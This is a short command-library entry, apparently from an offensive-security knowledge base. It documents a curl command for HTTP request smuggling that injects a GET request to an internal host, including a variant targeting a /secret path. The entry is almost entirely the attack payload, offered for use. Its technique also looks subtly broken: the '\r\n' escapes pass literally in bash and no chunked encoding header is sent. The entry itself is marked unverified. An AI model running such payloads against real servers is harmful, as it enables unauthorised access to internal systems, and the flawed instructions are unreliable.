---
data: >-
  curl -X POST https://target.example.com/ -H "Content-Type: text/plain" --data
  "0\r\n\r\nGET / HTTP/1.1\r\nHost: internal.example.com\r\n\r\n"
tags:
  - http
  - smuggling
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 73d7a124-ed70-4bc3-bd47-13a7bf867538
created_at: '2025-12-13T09:01:26.046Z'
updated_at: '2025-12-13T09:01:26.046Z'
verified: false
validated: true
submitted: true
---
# curl HTTP Smuggling Request

## Command

```bash
curl -X POST https://target.example.com/ -H "Content-Type: text/plain" --data "0\r\n\r\nGET / HTTP/1.1\r\nHost: internal.example.com\r\n\r\n"
```

## Description

This command uses curl to send a POST request with a crafted body designed for HTTP request smuggling, injecting a secondary GET request to an internal host.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the POST method | Yes |
| `-H "Content-Type: text/plain"` | Sets the content type header | Yes |
| `--data "..."` | The crafted smuggling payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.example.com/ -H "Content-Type: text/plain" --data "0\r\n\r\nGET / HTTP/1.1\r\nHost: internal.example.com\r\n\r\n"
```

### Advanced Usage

```bash
curl -X POST https://target.example.com/ -H "Content-Type: text/plain" -H "Custom-Header: value" --data "0\r\n\r\nGET /secret HTTP/1.1\r\nHost: internal.example.com\r\n\r\n"
```

## Expected Output

The response from the internal server, such as HTTP/1.1 200 OK with internal content, if smuggling succeeds.

## Related

- [[procedures/Perform-HTTP-Request-Smuggling-with-Crafted-POST-Request]]
- [[tools/curl]]
